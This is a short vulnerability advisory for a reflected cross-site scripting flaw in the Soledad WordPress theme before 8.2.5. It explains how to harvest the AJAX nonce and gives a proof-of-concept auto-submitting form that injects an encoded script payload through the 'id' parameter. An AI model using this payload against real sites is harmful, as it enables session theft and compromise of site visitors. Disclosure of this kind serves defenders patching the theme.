# Soledad < 8.2.5 - Reflected Cross-site Scripting

### Description

The theme does not sanitise the {id,datafilter[type],...} parameters in its penci\_more\_slist\_post\_ajax AJAX action, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.

### Proof of Concept

A threat actor can collect the nonce value on the main webpage by searching for it on the ajax\_var\_more call:
var ajax\_var\_more = {"url":"https:\/\/soledaddemo.pencidesign.net\/wp-admin\/admin-ajax.php","nonce":"d6c491629c","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","login":"Email Address","password":"Password","headerstyle":"default"};
And then can create a webpage redirecting the user to a compromised version of the site such as:
```
<html>
<body onload="myform.submit()">
<form action="https://soledaddemo.pencidesign.net/wp-admin/admin-ajax.php" method="POST" name="myform">
<input type="hidden" name="action" value="penci&#95;more&#95;slist&#95;post&#95;ajax" />
<input type="hidden" name="id" value="&quot;&gt;&lt;script&gt;alert&#96;XSS&#45;Checker&#96;&lt;&#47;script&gt;" />
<input type="hidden" name="nonce" value="d6c491629c" />
</form>
</body>
</html>
```
